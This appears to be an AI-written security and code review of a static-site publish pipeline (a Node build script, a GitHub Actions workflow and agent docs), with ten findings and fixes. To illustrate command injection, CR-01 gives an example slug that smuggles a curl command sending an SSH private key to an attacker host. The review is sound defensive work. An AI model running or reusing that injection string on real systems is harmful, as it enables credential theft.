---
phase: 01-production-deploy-pipeline
reviewed: 2026-08-20T00:00:00Z
depth: standard
files_reviewed: 5
files_reviewed_list:
  - _scripts/build-single.mjs
  - .github/workflows/publish.yml
  - CLAUDE.md
  - AGENTS.md
  - .claude/skills/wm-publish.md
findings:
  critical: 3
  warning: 4
  info: 3
  total: 10
status: issues_found
---

# Phase 01: Code Review Report

**Reviewed:** 2026-08-20T00:00:00Z
**Depth:** standard
**Files Reviewed:** 5
**Status:** issues_found

## Summary

Five files were reviewed covering the Phase 1 production deploy pipeline: the build wrapper script, the GitHub Actions publish workflow, the operator skill, and both documentation files. The implementation delivers the intended publish pipeline, but three blockers exist: a command injection vulnerability in the build script, a missing `persist-credentials: false` that AGENTS.md explicitly calls required, and an action version mismatch between the spec and the implementation. Four warnings cover additional injection exposure, a race condition in the skill's run-ID retrieval, unhandled exceptions, and a GITHUB_OUTPUT injection surface.

---

## Critical Issues

### CR-01: Command Injection in `build-single.mjs` — Unvalidated Slug Interpolated into Shell String

**File:** `_scripts/build-single.mjs:39`

**Issue:** `execSync` is called with a template-string command. When Node.js's `child_process.execSync` receives a plain string, it routes the command through `/bin/sh -c`. The `slug` value comes directly from `process.argv[2]` with no validation performed inside this script — the only guard is the regex check in `publish.yml`, which runs in a separate process. Any caller that invokes `build-single.mjs` directly (developer workflow, another script, future automation) bypasses that guard entirely.

A malicious slug such as `my-site; curl https://attacker.com/$(cat ~/.ssh/id_rsa)` would execute the injected command with the same privileges as the CI runner or developer's shell.

**Fix:** Add slug validation at the top of the script, and/or use `spawnSync` with an argument array (which never invokes a shell):

```js
// Option A — validate before use (mirrors publish.yml)
if (!/^[a-z0-9-]+$/.test(slug)) {
  console.error('Error: slug must match ^[a-z0-9-]+$');
  process.exit(1);
}

// Option B — avoid the shell entirely with spawnSync
import { spawnSync } from 'child_process';
const result = spawnSync(
  'node',
  [join(root, '_scripts/build-all.js'), slug],
  { stdio: 'inherit', env: { ...process.env }, cwd: root }
);
if (result.status !== 0) process.exit(result.status ?? 1);
```

Option B is strictly safer because it never constructs a shell command string. Both options together provide defence in depth.

---

### CR-02: Missing `persist-credentials: false` on `actions/checkout`

**File:** `.github/workflows/publish.yml:23-28`

**Issue:** AGENTS.md line 78 states explicitly: _"Must be set on `actions/checkout` step or PAT is silently overridden."_ The checkout step omits this flag. Without it, `actions/checkout` stores the default `GITHUB_TOKEN` credentials in the local git config. Later git operations — including the `git push origin main` in the "Update wiring.json" step — may use those stored `GITHUB_TOKEN` credentials instead of the explicit PAT URL set by `git remote set-url`, depending on git's credential-helper resolution order. The result is an authentication failure when pushing back to `main` (GITHUB_TOKEN cannot push to a protected branch), or worse, an inadvertent push using the wrong identity.

**Fix:**

```yaml
- name: Checkout
  uses: actions/checkout@v7
  with:
    token: ${{ secrets.WM_PUBLISH_PAT }}
    persist-credentials: false   # ← add this
```

---

### CR-03: Wrong JamesIves Action Version — `@v4.8.0` vs Required `@v4.9.0`

**File:** `.github/workflows/publish.yml:77`

**Issue:** AGENTS.md line 38 specifies `JamesIves/github-pages-deploy-action@v4.9.0`. The workflow pins `@v4.8.0`. If the required version is different, it was recorded in AGENTS.md deliberately, suggesting v4.9.0 fixed a relevant bug (likely around `single-commit` or `clean` behaviour). Using a lower version may cause deploy failures or leave stale artefacts on the `gh-pages` branch.

**Fix:**

```yaml
uses: JamesIves/github-pages-deploy-action@v4.9.0
```

---

## Warnings

### WR-01: Unquoted `${{ inputs.slug }}` in Shell `run:` Steps — Not Safe by Design

**File:** `.github/workflows/publish.yml:64, 70, 74, 101`

**Issue:** The slug is interpolated bare into multiple shell run commands:

```yaml
run: node _scripts/build-single.mjs ${{ inputs.slug }}
run: echo "..." > dist/${{ inputs.slug }}/CNAME
run: printf '...' > dist/${{ inputs.slug }}/robots.txt
git add sites/${{ inputs.slug }}/wiring.json
```

GitHub Actions expression interpolation happens before the shell sees the value. The regex validation in the prior step is the only guard, and it runs in a separate `node -e` invocation. This is not safe-by-design — it relies on an earlier step's exit code propagating correctly and on the regex being correct forever. The recommended pattern for workflow inputs in shell commands is to bind them to an environment variable and reference `$SLUG`:

**Fix:**

```yaml
- name: Build site
  run: node _scripts/build-single.mjs "$SLUG"
  env:
    SLUG: ${{ inputs.slug }}
    SITE_URL: https://${{ steps.wiring.outputs.domain }}
    SITE_BASE: /

- name: Inject CNAME
  run: echo "$DOMAIN" > "dist/$SLUG/CNAME"
  env:
    DOMAIN: ${{ steps.wiring.outputs.domain }}
    SLUG: ${{ inputs.slug }}
```

Apply the same pattern to the robots.txt and git-add steps.

---

### WR-02: Unhandled `execSync` Exception Produces Raw Stack Trace

**File:** `_scripts/build-single.mjs:39`

**Issue:** `execSync` throws a `ChildProcessError` on non-zero exit. The exception is uncaught, so Node.js dumps a raw stack trace — including the full command string with path and slug — to stderr. This is noisy and may leak path information. Since the script is documented as a user-facing CLI, it should exit cleanly.

**Fix:**

```js
try {
  execSync(`node ${join(root, '_scripts/build-all.js')} ${slug}`, {
    stdio: 'inherit',
    env: { ...process.env },
    cwd: root,
  });
} catch {
  // build-all.js already printed the error; just propagate the exit code
  process.exit(1);
}
```

(Or use the `spawnSync` approach from CR-01 fix, which makes the exit-code check explicit.)

---

### WR-03: Race Condition in Run-ID Retrieval in `/wm-publish` Skill

**File:** `.claude/skills/wm-publish.md:23-24`

**Issue:** The skill triggers the workflow then waits 3 seconds before fetching `--limit 1`:

```bash
sleep 3
RUN_ID=$(gh run list --workflow publish.yml --limit 1 --json databaseId -q '.[0].databaseId')
gh run watch "$RUN_ID" --exit-status
```

`--limit 1` returns the most recently created run across all slugs. If a separate publish for a different site was triggered within that 3-second window, `RUN_ID` will point to the wrong run. The concurrency group in `publish.yml` serialises runs per-slug but not across slugs. The skill would then watch the wrong run and report success/failure for the wrong deployment.

**Fix:** Use `--field slug=<slug>` filtering when listing runs, or capture the run ID from the dispatch response using `gh workflow run --json`:

```bash
RUN_ID=$(gh run list --workflow publish.yml --limit 5 --json databaseId,displayTitle \
  -q ".[] | select(.displayTitle | contains(\"$SLUG\")) | .databaseId" | head -1)
```

Or use the newer `gh workflow run --ref main` and capture the run URL from the output.

---

### WR-04: GITHUB_OUTPUT Written by String Concatenation — Newline Injection Surface

**File:** `.github/workflows/publish.yml:56-57`

**Issue:** The wiring validation step writes outputs by raw string concatenation:

```js
const out = 'domain=' + w.domain + '\nprod_repo=' + w.prod_repo;
fs.appendFileSync(process.env.GITHUB_OUTPUT, out + '\n');
```

If `w.domain` or `w.prod_repo` in `wiring.json` contain a newline character (possible with a corrupted or manually edited file), the appended content would inject additional key-value pairs into `GITHUB_OUTPUT`, silently overriding downstream step outputs. This is not prevented by the slug regex because it applies to the wiring file contents, not the slug.

**Fix:** Strip or reject newlines from the values before writing:

```js
const domain   = w.domain.replace(/[\r\n]/g, '');
const prod_repo = w.prod_repo.replace(/[\r\n]/g, '');
if (!domain || !prod_repo) { console.error('Error: domain/prod_repo must not be empty'); process.exit(1); }
const out = `domain=${domain}\nprod_repo=${prod_repo}\n`;
fs.appendFileSync(process.env.GITHUB_OUTPUT, out);
```

---

## Info

### IN-01: `CLAUDE.md` Still Marks `publish.yml` as `[TODO]`

**File:** `CLAUDE.md:163`

**Issue:** The repository layout section reads:

```
└── publish.yml  ← production publish (manual, per site) [TODO]
```

The workflow now exists. The `[TODO]` marker is stale and will confuse future readers about whether the workflow is operational.

**Fix:** Remove `[TODO]` from that line:

```
└── publish.yml  ← production publish (manual, per site)
```

---

### IN-02: JSON Parse Error Silently Discarded in Wiring Validation

**File:** `.github/workflows/publish.yml:52`

**Issue:** The catch block discards the actual parse error:

```js
catch(e) { console.error('Error: cannot read ' + path); process.exit(1); }
```

If the file exists but contains malformed JSON, the error message gives no hint that it is a parse failure rather than a missing file. `e.message` contains the exact position of the syntax error.

**Fix:**

```js
catch(e) { console.error('Error: cannot read ' + path + ' — ' + e.message); process.exit(1); }
```

---

### IN-03: Comment in `build-single.mjs` Describes Unreachable Code Path

**File:** `_scripts/build-single.mjs:37-38`

**Issue:** The comment states that `build-all.js` "exits 1 if the site is not found," used to justify why the pre-validation at lines 31-34 provides a "cleaner error." Because validation runs first and calls `process.exit(1)` when the site directory is absent, `build-all.js` never reaches its own not-found check via this code path. The comment is accurate in isolation but misleads a reader into thinking both guards are active.

**Fix:** Simplify the comment:

```js
// Delegate to build-all.js as a subprocess so stdio inheritance works correctly.
// Slug and site-directory have already been validated above.
```

---

_Reviewed: 2026-08-20T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
